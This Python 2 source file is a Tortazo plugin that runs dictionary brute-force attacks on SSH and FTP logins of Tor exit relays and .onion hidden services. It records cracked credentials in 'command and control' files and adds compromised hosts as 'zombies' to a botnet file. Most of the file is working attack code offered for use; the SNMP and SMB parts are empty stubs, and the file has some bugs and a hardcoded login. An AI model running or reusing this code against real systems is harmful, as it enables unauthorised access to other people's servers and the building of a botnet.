# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

bruterPlugin.py

bruterPlugin is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

bruterPlugin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from core.tortazo.pluginManagement.BasePlugin import BasePlugin
from stem.version import Version
from prettytable import PrettyTable
import paramiko
import ftplib
import os
import sys
from smb.SMBConnection import SMBConnection
import logging as log
from socket import error as socket_error

class bruterPlugin(BasePlugin):
    '''
    Class to  implement a bruteforce plugin against TOR exit nodes and hidden services in the deep web.
    '''

    def __init__(self, torNodes=[]):
        BasePlugin.__init__(self, torNodes, 'bruterPlugin')
        self.setPluginDetails('bruterPlugin', "Bruteforce plugin for services in the deep web. TIP: If you run this plugin in SSH Brute force mode, don't activate the -v/..verbose. If you use that option, you'll see a lot of debug message traced by Paramiko library.", '1.0', 'Adastra: @jdaanial')
        if len(torNodes) > 0:
            self.info("[*] bruterPlugin Initialized!")
        self.bruteForceData = {}
        for torNode in self.torNodes:
            openPorts = []
            for port in torNode.openPorts:
                openPorts.append(port.port)
                if len(openPorts) > 0:
                    self.bruteForceData[torNode.host] = openPorts


    def __del__(self):
        if len(self.torNodes) > 0:
            self.info("[*] bruterPlugin Destroyed!")

    def setDictSeparator(self, separator):
        print "[+] Setting separator '%s' for dictionary files. Every line en the file must contain <user><separator><passwd>" %(separator)
        self.separator = separator

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SSH BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def sshBruterOnRelay(self, relay, dictFile=None, port=22, force=False):
        if self.bruteForceData.has_key(relay) == False:
            print "[-] IP Adress %s not found in the relays" %(relay)
            return
        if port not in self.bruteForceData[relay] and force == False:
            print "[-] Port %s in the selected relay is 'closed' in the information recorded in database. If this really open, use the parameter 'force=True' of this function"
            return

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(relay, str(port))

        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    try:
                        if self.performSSHConnection(relay, user, passwd):
                            stop_attack = True
                            break
                    except:
                        print "[-] Captured exception. Finishing attack."
                        return
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            import os
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The file selected doesn't exists or is a directory."
                return
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try:
                    if self.performSSHConnection(relay, user, passwd):
                        break
                except:
                    print "[-] Captured exception. Finishing attack."
                    return

            
    def sshBruterOnAllRelays(self, dictFile=None, port=22, force=False):
        for relay in self.bruteForceData:
            self.sshBruterOnRelay(relay=relay, dictFile=dictFile, port=port, force=force)

    def sshBruterOnHiddenService(self, onionService, port=22, dictFile=None):
        #if len(onionService) != 22 and onionService.endswith('.onion') == False:
        #    print "[-] Invalid Onion Adress %s must contain 16 characters. The TLD must be .onion" %(onionService)
        #    return

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(onionService, str(port))
        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for password in passList:
                    try:
                        if self.performSSHConnectionHiddenService(onionService, port, user, password):
                            stop_attack = True
                            break
                    except socket_error as serr:
                        print serr
                        print "Connection Refused... Exiting."
                        return
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            import os
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The file selected doesn't exists or is a directory."
                return
            for line in open(dictFile, "r").readlines():
                [user, password] = line.strip().split(self.separator)
                try:
                    if self.performSSHConnectionHiddenService(onionService, port, user, password):
                        break
                except socket_error as serr:
                    print "Connection Refused... Finishing the attack."
                    return



    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM FTP BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def ftpBruterOnRelay(self, relay, dictFile=None):
        print "[+] Buruteforce on relay %s " %(relay)
        ftpFileName = 'commandandcontrolftp.txt'
        print "[+] Trying Anonymous access in: %s " %(relay)
        try:
            ftpClient = ftplib.FTP(relay)
            ftpClient.login()
            print "[+] Anonymous access allowed in: %s " %(relay)
            ftpFile = open(ftpFileName, 'a')
            entry = '%s:%s:%s' %(relay, 'anonymous', 'anonymous')
            ftpFile.write(entry+'\n')
            ftpFile.close()
        except:
            print "[-] Anonymous access is not allowed in: %s "%(relay)

        if(dictFile is not None and os.path.exists(dictFile)):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split()
                try :
                    ftpClient = ftplib.FTP(relay)
                    ftpClient.login(user, passwd)
                except socket_error as serr:
                        print "Connection Refused... Exiting."
                        return
                except:
                    continue
                if ftpClient:
                    print "[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd)
                    ftpClient.quit()
                    ftpFile = open(ftpFileName, 'a')
                    entry =  '%s:%s:%s' %(relay, user, passwd)
                    ftpFile.write(entry+'\n')
                    ftpFile.close()
                    ftpClient.close()
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()

            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    try :
                        ftpClient = ftplib.FTP(relay)
                        ftpClient.login(user, passwd)
                    except:
                        continue
                    if ftpClient:
                        print "[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd)
                        ftpClient.quit()
                        ftpFile = open(ftpFileName, 'a')
                        entry =  '%s:%s:%s' %(relay, user, passwd)
                        ftpFile.write(entry+'\n')
                        ftpFile.close()
                        ftpClient.close()
                        stop_attack=True


    def ftpBruterOnAllRelays(self, relay, dictFile=None):
        for relay in self.bruteForceData:
            self.ftpBruterOnRelay(relay, dictFile)
        

    def ftpBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."            


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SNMP BRUTEFORCE ATTACKS.########################################################################
    ################################################################################################################################################
    def snmpBruterOnRelay(self, relay, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def snmpBruterOnAllRelays(self, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def snmpBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."            


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SMB BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def smbBruterOnRelay(self, relay, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
            

    def smbBruterOnAllRelays(self, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def smbBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."


    ################################################################################################################################################
    ###########################   COMMON FUNCTIONS.   ##############################################################################################
    ################################################################################################################################################
    def performSSHConnection(self, host, port, user, passwd):
        '''
        Perform SSH Connections using the tortazo_botnet.bot file.
        '''
        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=log.WARN)
        tortazoFile = os.getcwd()+'/tortazo_botnet.bot'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshFileName = 'commandandcontrolssh.txt'
        try:
            if self.socksHost is not None and self.socksPort is not None:
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                #proxy = paramiko.ProxyCommand('connect -S '+self.socksHost+':'+str(self.socksPort)+' %h %p' )
                #print proxy
                #client.connect(host, username=user, password=passwd, sock=proxy)
                client.connect(host, port, username='adastra', password='peraspera')
            else:
                client.connect(host, username=user, password=passwd)
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as sshExc:
            print "Seems that the SSH Service is not running. Please, check that before running the bruteforce attack."
            raise sshExc
        except Exception as exc:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise exc
        if client:
            print "[+] SSH Bruteforce Success ... username: %s and password %s is VALID! " % (user, passwd)
            client.close()
            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
            if os.path.exists(sshFileName) == False:
                sshFile = open(sshFileName, 'w')
            else:
                sshFile = open(sshFileName, 'a')
            entry =  '%s:%s:%s' %(host, user, passwd)
            sshFile.write(entry+'\n')
            sshFile.close()
            print "[+] Updating the file 'tortazo_botnet.bot' with the new Zombie"
            if os.path.exists(tortazoFile) == False:
                tortazoFd = open(tortazoFile, 'w')
            else:
                tortazoFd = open(tortazoFile, 'a')
            #host:user:pass:port:nickname
            nickname = '--'
            for torNode in self.torNodes:
                if torNode.host == host:
                    nickname = torNode.nickName
                    break
            entryBotnet = '%s:%s:%s:%s:%s' %(host, user, passwd, port, nickname)
            content = open(tortazoFile, 'r').readlines()
            if entryBotnet in content:
                print "[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file"
            else:
                tortazoFd.write(entryBotnet)
                print "[+] Entry %s added" %(entry)
                tortazoFd.close()
            return True

    def performSSHConnectionHiddenService(self, onionService, port, user, passwd):
        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=self.cli.logger.ERROR)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        proxyCommand = os.getcwd()+'/plugins/bruteforce/utils/connect-socks -S '+self.socksHost+':'+str(self.socksPort)+' '+onionService+' '+str(port)
        print proxyCommand
        proxy = paramiko.ProxyCommand(proxyCommand)
        try:
            # IF Hidden Service is incorrect: SSHException: Error reading SSH protocol banner
            # IF Bad user/passwd: AuthenticationException:
            # IF Bad Proxy: ProxyCommandFailure:

            client.connect(onionService, port, username=user, password=passwd, sock=proxy)
        except paramiko.SSHException as sshExc:
            print "Seems that the Hidden Service is not running. Please, check that before running the bruteforce attack."
            raise sshExc
        except paramiko.AuthenticationException:
            return False
        except paramiko.ProxyCommandFailure as proxyExc:
            print "Proxy Failure. The settings used are: Host=%s and Port=%s. Check your TOR Socks proxy if you haven't used the options -T and -U." %(self.socksHost,self.socksPort)
            raise proxyExc
        except Exception as exc:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise exc

        if client:
            print "[+] SSH Bruteforce Success ... username: %s and password %s is VALID! " % (user, passwd)
            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
            if os.path.exists(sshFileName) == False:
                sshFile = open(sshFileName, 'w')
            else:
                sshFile = open(sshFileName, 'a')
            entry =  '%s:%s:%s' %(onionService, user, passwd)
            sshFile.write(entry+'\n')
            sshFile.close()
            client.close()

    def getUserlistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/names/namelist.txt
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-users.txt
        fuzzdb/wordlists-user-passwd/faithwriters.txt
        and returns a list of words (used as possible usernames)
        '''
        print "[+] Generating users list using the files in FuzzDB"
        users = []
        try:
            namelist = open('fuzzdb/wordlists-user-passwd/names/namelist.txt', 'r')
            johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
            unixusers = open('fuzzdb/wordlists-user-passwd/unix-os/unix_users.txt', 'r')
            faithwriters = open('fuzzdb/wordlists-user-passwd/faithwriters.txt', 'r')
        except:
            print sys.exc_info()

        for userNameList in namelist.readlines():
            users.append(userNameList)

        for userJohnList in johnlist.readlines():
            users.append(userJohnList)

        for userunix in unixusers.readlines():
            users.append(userunix)

        for userfaithwriter in faithwriters.readlines():
            users.append(userfaithwriter)
        return users

    def getPasslistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-passwords.txt
        fuzzdb/wordlists-user-passwd/weaksauce.txt

        and returns a list of words (used as possible usernames)
        '''
        print "[+] Generating passwords list using the files in FuzzDB"
        passwords = []
        johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
        unixpasswords = open('fuzzdb/wordlists-user-passwd/unix-os/unix_passwords.txt', 'r')
        weaksauce = open('fuzzdb/wordlists-user-passwd/passwds/weaksauce.txt', 'r')
        for johnpass in johnlist.readlines():
            passwords.append(johnpass)

        for unixpass in unixpasswords.readlines():
            passwords.append(unixpass)

        for wealsauce in weaksauce.readlines():
            passwords.append(wealsauce)

        return passwords
    
        
    def help(self):
        print "[*] Functions availaible available in the Plugin..."
        tableHelp = PrettyTable(["Function", "Description", "Example"])
        tableHelp.padding_width = 1
        tableHelp.padding_width = 1
        tableHelp.add_row(['help', 'Help Banner', 'self.help()'])
        tableHelp.add_row(['printRelaysFound', 'Table with the relays found.', 'self.printRelaysFound()'])
        tableHelp.add_row(['setDictSeparator', 'Sets an separator for dictionary files. Every line en the file must contain <user><separator><passwd>.', 'self.setDictSeparator(":")'])
        tableHelp.add_row(['sshBruterOnRelay', 'Execute a bruteforce attack against an SSH Server in the relay entered. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnRelay('37.213.43.122', dictFile='/home/user/dict')"])
        tableHelp.add_row(['sshBruterOnAllRelays', 'Execute a bruteforce attack against an SSH Server in the relays founded. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnAllRelays(dictFile='/home/user/dict')"])
        tableHelp.add_row(['sshBruterOnHiddenService', 'Execute a bruteforce attack against an SSH Server in the onion address entered.', 'self.sshBruterOnHiddenService("5bsk3oj5jufsuii6.onion", dictFile="/home/user/dict")'])
        print tableHelp
